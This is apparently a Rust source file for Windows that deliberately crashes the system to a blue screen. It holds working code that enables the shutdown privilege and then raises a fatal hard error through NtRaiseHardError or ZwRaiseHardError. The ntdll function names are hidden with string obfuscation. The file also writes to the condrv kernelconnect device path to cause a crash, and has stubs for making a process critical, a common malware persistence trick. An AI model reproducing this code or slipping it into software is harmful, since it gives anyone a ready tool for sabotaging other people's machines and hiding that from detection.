use anyhow::Result;
use core::ptr::null;
use std::ffi::CString;
use std::fs::OpenOptions;
use std::io::Write;
use winapi::ctypes::c_ulong;
use winapi::shared::minwindef::{HMODULE, ULONG};
use winapi::shared::ntdef::{BOOLEAN, NTSTATUS};
use winapi::shared::ntstatus::STATUS_FLOAT_MULTIPLE_FAULTS;
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
use winreg::enums::HKEY_LOCAL_MACHINE;
use winreg::enums::REG_PROCESS_APPKEY;
use winreg::RegKey;

const SHUTDOWN_PRIVILEGE: ULONG = 19;
const OPTION_SHUTDOWN: ULONG = 6;

type RtlAdjustPrivilegeFn = unsafe extern "system" fn(
    privilege: ULONG,
    enable: BOOLEAN,
    current_thread: BOOLEAN,
    enabled: *mut BOOLEAN,
) -> NTSTATUS;

type NtRaiseHardErrorFn = unsafe extern "system" fn(
    error_status: NTSTATUS,
    number_of_parameters: ULONG,
    unicode_string_parameter_mask: ULONG,
    parameters: *mut c_ulong,
    response_option: ULONG,
    response: *mut ULONG,
) -> NTSTATUS;

type ZwRaiseHardErrorFn = unsafe extern "system" fn(
    error_status: NTSTATUS,
    number_of_parameters: ULONG,
    unicode_string_parameter_mask: ULONG,
    parameters: *mut c_ulong,
    response_option: ULONG,
    response: *mut ULONG,
) -> NTSTATUS;

pub fn nt_bsod() {
    unsafe {
        let ntdll: HMODULE =
            LoadLibraryA(CString::new(obfstr::obfstr!("ntdll.dll")).unwrap().as_ptr());

        let rtl_adjust_privilege: RtlAdjustPrivilegeFn = std::mem::transmute(GetProcAddress(
            ntdll,
            CString::new(obfstr::obfstr!("RtlAdjustPrivilege"))
                .unwrap()
                .as_ptr(),
        ));

        let mut enabled: BOOLEAN = 0;
        if rtl_adjust_privilege(SHUTDOWN_PRIVILEGE, 1, 0, &mut enabled) == 0 {
            let nt_raise_hard_error: NtRaiseHardErrorFn = std::mem::transmute(GetProcAddress(
                ntdll,
                CString::new(obfstr::obfstr!("NtRaiseHardError"))
                    .unwrap()
                    .as_ptr(),
            ));

            let mut response: ULONG = 0;
            nt_raise_hard_error(
                0xC0000002u32 as i32,
                0,
                0,
                std::ptr::null_mut(),
                OPTION_SHUTDOWN,
                &mut response,
            );
        }
    }
}

pub fn zw_bsod() {
    unsafe {
        let ntdll: HMODULE =
            LoadLibraryA(CString::new(obfstr::obfstr!("ntdll.dll")).unwrap().as_ptr());

        let rtl_adjust_privilege: RtlAdjustPrivilegeFn = std::mem::transmute(GetProcAddress(
            ntdll,
            CString::new(obfstr::obfstr!("RtlAdjustPrivilege"))
                .unwrap()
                .as_ptr(),
        ));

        let mut enabled: BOOLEAN = 0;
        if rtl_adjust_privilege(SHUTDOWN_PRIVILEGE, 1, 0, &mut enabled) == 0 {
            let zw_raise_hard_error: ZwRaiseHardErrorFn = std::mem::transmute(GetProcAddress(
                ntdll,
                CString::new(obfstr::obfstr!("ZwRaiseHardError"))
                    .unwrap()
                    .as_ptr(),
            ));

            let mut response: ULONG = 0;
            zw_raise_hard_error(
                0xC0000002u32 as i32,
                0,
                0,
                std::ptr::null_mut(),
                OPTION_SHUTDOWN,
                &mut response,
            );
        }
    }
}

pub fn syscall_nt_bsod() {
    unsafe {}
}

pub fn make_process_critical() {
    //ntdll
    //RtlAdjPrivilege (SeDebugPrivilege)
    //NtSetINformationProcess
    //RtlNtStatusToDosError
}

pub fn admin_crash() {
    let path = r"\\.\globalroot\device\condrv\kernelconnect";
    let mut file = OpenOptions::new()
        .write(true)
        .append(true)
        .open(path)
        .unwrap();

    file.write_all(b" ").unwrap();
}
